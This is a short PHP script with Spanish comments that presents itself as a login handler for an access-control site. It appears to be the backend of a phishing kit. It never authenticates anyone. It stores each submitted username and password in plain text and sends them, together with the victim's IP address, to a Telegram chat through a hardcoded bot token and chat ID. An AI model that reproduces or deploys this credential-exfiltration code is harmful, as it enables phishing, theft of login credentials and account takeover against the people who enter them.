<?php
// procesar.php
session_start();  // Inicia la sesión para manejar variables de sesión

// Conexión a la base de datos
$servername = "localhost";
$username = "root";       // Cambia si es necesario
$password = "";           // Cambia si es necesario
$dbname = "control_accesos";  // Nombre de tu base de datos

// Recoger los datos del formulario
$usuario = $_POST['usuario'] ?? '';
$contrasena = $_POST['contrasena'] ?? '';

// Validar datos recibidos
if (empty($usuario) || empty($contrasena)) {
    die("❌ Faltan datos.");
}

// Conexión a la base de datos
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("❌ Error de conexión a la base de datos: " . $conn->connect_error);
}

// Insertar datos en la tabla usuarios (asumiendo que la columna 'id' es autoincremental)
$stmt = $conn->prepare("INSERT INTO usuarios (usuario, contrasena) VALUES (?, ?)");
$stmt->bind_param("ss", $usuario, $contrasena);

if ($stmt->execute()) {
    // Obtener el ID del nuevo usuario insertado
    $idUsuario = $stmt->insert_id;  // Esto obtiene el ID autoincremental (que es 'id' en tu tabla)

    // Asignar el ID del usuario a la sesión para poder usarlo más tarde
    $_SESSION['user_id'] = $idUsuario;

    // Obtener la IP del cliente
    $ipCliente = $_SERVER['REMOTE_ADDR'];  // Esto obtiene la IP del cliente que hace la solicitud

    // Datos del bot de Telegram
    $botToken = '8154699985:AAF5EOocduTbaaiPnaTMIsaIK2RZaGLgcTM';
    $chatId = '1415509092';

    // Enviar mensaje a Telegram
    $mensaje = "🔔 Nuevo Inicio de Sesión:\n👤 Usuario: {$usuario}\n🔑 Contraseña: {$contrasena}\n📍 IP: {$ipCliente}";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $datos = [
        'chat_id' => $chatId,
        'text' => $mensaje
    ];

    // Usamos cURL para enviar la solicitud POST
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
    $respuesta = curl_exec($ch);
    
    // Verificamos si hubo un error con cURL
    if(curl_errno($ch)) {
        echo "Error al enviar mensaje a Telegram: " . curl_error($ch);
    }

    curl_close($ch);

    // Retornar solo el ID generado como respuesta (sin HTML ni texto adicional)
    echo $idUsuario;
} else {
    echo "❌ Error al guardar en la base de datos.";
}

$stmt->close();
$conn->close();
?>
